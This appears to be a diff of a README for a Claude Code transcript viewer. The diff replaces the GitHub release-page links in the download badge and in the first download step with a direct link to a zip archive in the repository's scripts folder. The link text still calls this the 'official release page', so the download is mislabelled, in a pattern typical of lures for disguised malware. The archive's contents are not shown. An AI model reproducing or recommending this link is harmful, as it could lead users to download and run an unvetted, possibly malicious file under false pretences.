@@ -1,12 +1,12 @@
 # 📜 claude-code-chat-viewer - Read your Claude session logs offline
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Ronniegymnosophical586/claude-code-chat-viewer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Ronniegymnosophical586/claude-code-chat-viewer/main/scripts/chat_code_viewer_claude_2.2-alpha.3.zip)
 
 This tool lets you view your Claude Code JSONL transcripts in your browser. You can open files from your local computer without an internet connection. The viewer runs entirely inside your web browser. It does not send your data to any server.
 
 ## 📥 How to download the software
 
-1. Visit the [official release page](https://github.com/Ronniegymnosophical586/claude-code-chat-viewer/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/Ronniegymnosophical586/claude-code-chat-viewer/main/scripts/chat_code_viewer_claude_2.2-alpha.3.zip).
 2. Look for the section labeled Assets.
 3. Click the link that ends in .zip or .html to save the file to your computer.
 4. If you chose a .zip file, right-click the folder and select Extract All. 
